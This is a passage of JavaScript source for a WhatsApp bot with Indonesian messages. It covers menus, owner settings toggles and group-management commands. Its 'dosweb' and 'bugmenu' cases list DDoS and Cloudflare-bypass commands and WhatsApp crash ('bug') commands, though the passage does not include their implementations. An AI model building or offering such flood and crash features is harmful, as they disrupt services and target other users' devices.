│›› Owner
║›› Zap
│
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣`
				//Button Menu
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": BUTTON,
									...(await prepareWAMessageMedia({
										image: V1
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "            ⿻  ⌜ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢️ ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "single_select",
										"buttonParamsJson": `{
                        "title": "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",
                        "sections": [
        {
            "title": "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️️",
            "highlight_label": "️〽️️",
            "rows": [
                {
                    "header": "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
                    "title": "ᨒ",
                    "id": ".allmenu"
                },
                {
                    "header": "𝐎𝐖𝐍𝐄𝐑",
                    "title": "𐁘",
                    "id": ".xowner"
                }
            ]
        },
        {
            "title": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
            "highlight_label": "𝐗𝐗𝐕𝐈𝐏",
            "rows": [
                {
                    "header": "𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸",
                    "title": "ϟ",
                    "id": "travazap"
                }
            ]
        },
        {
            "highlight_label": "𝐕𝐕𝐈𝐏",
            "rows": [
                {
                    "header": "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",                   
                    "title": "››",
                    "id": "bugmenu"
                }
            ]
        },
        {
            "highlight_label": "𝐃𝐨𝐒",
            "rows": [
                {
                    "header": "𝐃𝐃𝐎𝐒",                   
                    "title": "›",
                    "id": "dosweb"
                }
            ]
        }
    ]
}`
									}, {
										"name": "cta_url",
										"buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://youtube.com/@PakTzy\",\"merchant_url\":\"https://youtube.com/@PakTzy\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: V1,
					caption: MSG,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: V1,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				}
			}
			break
			//=================================================//
			case "allmenu": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				let X1 = [TheZhiro, nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let itsmenu = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`OWNER CMD\` 」* ─═⬣
│┏⊱
║⿻ Addowmer
│⿻ Delowner
║⿻ Addprem
│⿻ Delprem
║⿻ Listown
│⿻ Listprem
║⿻ Autobutton
│⿻ Setprefix
║⿻ Restart
│⿻ Shutdown
║⿻ Autorecord
│⿻ Autotyping
║⿻ Autoread
│⿻ Autobio
║⿻ Setmenu
│⿻ Setpp
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`SEARCH\` 」* ─═⬣
│┏⊱
║⿻ Play
│⿻ Pin
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`TOOLSS\` 」* ─═⬣
│┏⊱
║⿻ Ai
│⿻ El
║⿻ Hdr
│⿻ Hd
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`GROUPS\` 」* ─═⬣
│┏⊱
║⿻ Tagsubject
│⿻ Setppgc
║⿻ Tagall
│⿻ Hidetag
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`DOWLOAD\` 」* ─═⬣
│┏⊱
║⿻ Mediafire
│⿻ Threads
║⿻ Ttslide
│⿻ Ttmp4
║⿻ Ttmp3
│⿻ Ythd
║⿻ Ytmp4
│⿻ Ytmp3
║⿻ Insta
│⿻ Xvid
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`EXSTRAS\` 」* ─═⬣
│⿻ Removebg
║⿻ Translate
│⿻ Soundtxt
║⿻ Getppgc
│⿻ Runtime
║⿻ Recolor
│⿻ Stalkig
║⿻ Ssweb
│⿻ Cecan
║⿻ Speed
│⿻ Toaud
║⿻ Toimg
│⿻ Getpp
║⿻ Tourl
│⿻ Rvo
│⿻ Smeme
║⿻ Sticker
│⿻ Owner
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

┏━━⬣  Thanks To  友
┃ 🔥 The Getsuzo Zhiro </> Dev\`
┃ 🔥 The Zetsu Boxygen
┃ 🔥 Aztecs
┃ 🔥 SkyZet
┃ 🔥 Kizyy
┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
`
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": itsmenu,
									...(await prepareWAMessageMedia({
										image: TheZhiro
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: TheZhiro,
					caption: itsmenu,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: TheZhiro,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: Zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				}
			}
			break
			//=================================================//
			case "dosweb": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				let X1 = [nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let itsmenu = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`DDOS\` 」* ─═⬣
│┏⊱
║⿻ Ddos
│⿻ Dos
║⿻ Mix
│⿻ Floods
║⿻ Ua
│⿻ Xchrome
║⿻ Tls
│⿻ Tlsbypass
║⿻ Tlsv2
│⿻ Bypass-cf
║⿻ Tls-vip
│⿻ Xc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

┏━━⬣  Thanks To  友
┃ 🔥 The Getsuzo Zhiro </> Dev\`
┃ 🔥 The Zetsu Boxygen
┃ 🔥 Aztecs
┃ 🔥 SkyZet
┃ 🔥 Kizyy
┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
`
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": itsmenu,
									...(await prepareWAMessageMedia({
										image: TheZhiro
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: TheZhiro,
					caption: itsmenu,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: TheZhiro,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: Zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						hax: msg.key.id
					})
				}
			}
			break
			case "bugmenu": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				let X1 = [nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let itsmenu = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`BUG MENU\` 」* ─═⬣
│┏⊱
║⿻ Vpay
│⿻ Zerobug
║⿻ Zap
│⿻ Loxas
║⿻ Bugcomunity
│⿻ Convite
║⿻ Rosapay
│⿻ Convite-nova
║⿻ Crashgp
│⿻ Locimg
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

┏━━⬣  Thanks To  友
┃ 🔥 The Getsuzo Zhiro </> Dev\`
┃ 🔥 The Zetsu Boxygen
┃ 🔥 Aztecs
┃ 🔥 SkyZet
┃ 🔥 Kizyy
┗━━⬣  ⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨🐉 ⌟  ⿻
`
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": itsmenu,
									...(await prepareWAMessageMedia({
										image: TheZhiro
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\"𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸\",\"id\":\".xowner\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: TheZhiro,
					caption: itsmenu,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: TheZhiro,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: Zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						hax: msg.key.id
					})
				}
			}
			break


			// CASE MENU \\

			// OWNER CONTROL \\
			//=================================================//
			case "owner":
			case "xowner": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				let namaown = `𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
				var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"contactMessage": {
						"displayName": `${namaown}`,
						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
					}
				}), {
					userJid: m.chat,
					quoted: zets
				})
				VxoZap.relayMessage(m.chat, contact.message, {
					messageId: contact.key.id
				})
			}
			break
			//=================================================//
			case "setprefix":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "multi" || text == "1") {
					if (db.data.settings[botNumber].setPrefix == "multi") return zreply("Sudah Active")
					db.data.settings[botNumber].setPrefix = "multi"
					zreply(`${mess.success}`)
				} else if (text == "no" || text == "2") {
					if (db.data.settings[botNumber].setPrefix == "no") return zreply("Sudah Active")
					db.data.settings[botNumber].setPrefix = "no"
					zreply(`${mess.success}`)
				} else if (text == "all" || text == "3") {
					if (db.data.settings[botNumber].setPrefix == "all") return zreply("Sudah Active")
					db.data.settings[botNumber].setPrefix = "all"
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 SETTINGS PREFIX BOT 」\`\`\`",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"sections": [{
								"title": "MULTI",
								"id": `${prefix + command} 1`
							},
							{
								"title": "NO PREFIX",
								"id": `${prefix + command} 2`
							},
							{
								"title": "ALL PREFIX",
								"id": `${prefix + command} 3`
							},
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 SETTINGS PREFIX BOT 」\`\`\`\n\n1. Multi\n2. No\n3. All")
				}
				break
				//=================================================//
			case "autobutton":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "on" || text == "1") {
					if (db.data.settings[botNumber].autoButton == true) return zreply("Sudah Active")
					db.data.settings[botNumber].autoButton = true
					zreply(`${mess.success}`)
				} else if (text == "off" || text == "0") {
					if (db.data.settings[botNumber].autoButton == false) return zreply("Sudah Non Active")
					db.data.settings[botNumber].autoButton = false
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 MODE AUTO BUTTON 」\`\`\`",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
								"displayText": "𝐎𝐍𝐍",
								"id": `${prefix + command} 1`
							},
							{
								"displayText": "𝐎𝐅𝐅",
								"id": `${prefix + command} 0`
							}
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 MODE AUTO BUTTON 」\`\`\`\n\n0. Off\n1. On")
				}
				break
				//=================================================//
			case "setmenu":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "button" || text == "1") {
					if (db.data.settings[botNumber].menuType == "buttonImage") return zreply("Sudah Active")
					db.data.settings[botNumber].menuType = "buttonImage"
					zreply(`${mess.success}`)
				} else if (text == "non" || text == "2") {
					if (db.data.settings[botNumber].menuType == "externalImage") return zreply("Sudah Active")
					db.data.settings[botNumber].menuType = "externalImage"
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 SETTINGS MENU BOT 」\`\`\`",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"sections": [{
								"title": "BUTTONS IMAGES",
								"id": `${prefix + command} 1`
							},
							{
								"title": "EXTERNAL IMAGES",
								"id": `${prefix + command} 2`
							},
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 SETTINGS MENU BOT 」\`\`\`\n\n1. button\n2. non")
				}
				break
				//=================================================//
			case "autorecord":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "on" || text == "1") {
					if (db.data.settings[botNumber].autoRecord == true) return zreply("Sudah Active")
					db.data.settings[botNumber].autoRecord = true
					zreply(`${mess.success}`)
				} else if (text == "off" || text == "0") {
					if (db.data.settings[botNumber].autoRecord == false) return zreply("Sudah Non Active")
					db.data.settings[botNumber].autoRecord = false
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 MODE AUTO RECORD 」\`\`\`",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
								"displayText": "ON",
								"id": `${prefix + command} 1`
							},
							{
								"displayText": "OFF",
								"id": `${prefix + command} 0`
							}
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 MODE AUTO RECORD 」\`\`\`\n\n0. Off\n1. On")
				}
				break
				//=================================================//
			case "autoread":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "on" || text == "1") {
					if (db.data.settings[botNumber].autoread == true) return zreply("Sudah Active")
					db.data.settings[botNumber].autoread = true
					zreply(`${mess.success}`)
				} else if (text == "off" || text == "0") {
					if (db.data.settings[botNumber].autoread == false) return zreply("Sudah Non Active")
					db.data.settings[botNumber].autoread = false
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 MODE AUTO READ 」\`\`\`",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
								"displayText": "ON",
								"id": `${prefix + command} 1`
							},
							{
								"displayText": "OFF",
								"id": `${prefix + command} 0`
							}
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 MODE AUTO READ 」\`\`\`\n\n0. Off\n1. On")
				}
				break
				//=================================================//
			case "autotyping":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "on" || text == "1") {
					if (db.data.settings[botNumber].autoTyping == true) return zreply("Sudah Active")
					db.data.settings[botNumber].autoTyping = true
					zreply(`${mess.success}`)
				} else if (text == "off" || text == "0") {
					if (db.data.settings[botNumber].autoTyping == false) return zreply("Sudah Non Active")
					db.data.settings[botNumber].autoTyping = false
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 MODE AUTO TYPING 」\`\`\`",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
								"displayText": "ON",
								"id": `${prefix + command} 1`
							},
							{
								"displayText": "OFF",
								"id": `${prefix + command} 0`
							}
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 MODE AUTO TYPING 」\`\`\`\n\n0. Off\n1. On")
				}
				break
				//=================================================//
			case "autobio":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (text == "on" || text == "1") {
					if (db.data.settings[botNumber].autobio == true) return zreply("Sudah Active")
					db.data.settings[botNumber].autobio = true
					zreply(`${mess.success}`)
				} else if (text == "off" || text == "0") {
					if (db.data.settings[botNumber].autobio == false) return zreply("Sudah Non Active")
					db.data.settings[botNumber].autobio = false
					zreply(`${mess.success}`)
				} else if (db.data.settings[botNumber].autoButton) {
					VxoZap.sendButtons(m.chat, {
						"body": "\`\`\`「 MODE AUTO BIO 」\`\`\`",
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
								"displayText": "ON",
								"id": `${prefix + command} 1`
							},
							{
								"displayText": "OFF",
								"id": `${prefix + command} 0`
							}
						]
					}, {
						quoted: Zets
					})
				} else {
					zreply("\`\`\`「 MODE AUTO BIO 」\`\`\`\n\n0. Off\n1. On")
				}
				break
				//=================================================//

				// SS WEB \\
				//=================================================//
			case "ssweb": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example: \nSspc Link`)
				let desktop = await ssweb(text, "desktop")
				VxoZap.sendFile(m.chat, desktop.result, "", ``, m, false)
			}
			break
			//=================================================//

			//Group Vitur\\
			//=================================================//
			case "add": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
				await VxoZap.groupParticipantsUpdate(m.chat, [Inputo], "add").then((res) => zreply(`Berhasil Menambahkan ${Inputo.split("@")[0]} Di Group ${groupName}`)).catch((err) => zreply(jsonformat(err)))
			}
			break
			//=================================================//
			case "kick": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
				await VxoZap.groupParticipantsUpdate(m.chat, [Inputo], "remove").then((res) => zreply(`Berhasil Mengeluarkan ${Inputo.split("@")[0]} Di Group ${groupName}`)).catch((err) => zreply(jsonformat(err)))
			}
			break
			//=================================================//
			case "promote": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
				await VxoZap.groupParticipantsUpdate(m.chat, [Inputo], "promote").then((res) => zreply(`Berhasil Promote ${Inputo.split("@")[0]} Di Group ${groupName}`)).catch((err) => zreply(jsonformat(err)))
			}
			break
			//=================================================//
			case "demote": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
				await VxoZap.groupParticipantsUpdate(m.chat, [Inputo], "demote").then((res) => zreply(`Berhasil Demote ${Inputo.split("@")[0]} Di Group ${groupName}`)).catch((err) => zreply(jsonformat(err)))
			}
			break
			case "getppgc":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isGroup) return
				zreply(mess.wait)
				try {
					var ppimg = await VxoZap.profilePictureUrl(m.chat, "image")
				} catch (err) {
					console.log(err)
					var ppimg = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
				}
				await VxoZap.sendMessage(m.chat, {
					image: {
						url: ppimg
					}
				}, {
					quoted: Zets
				})
				break
			case 'join': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (!text) return zreply(`Masukan Link Group !`)
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return zreply(`Link Eror !`)
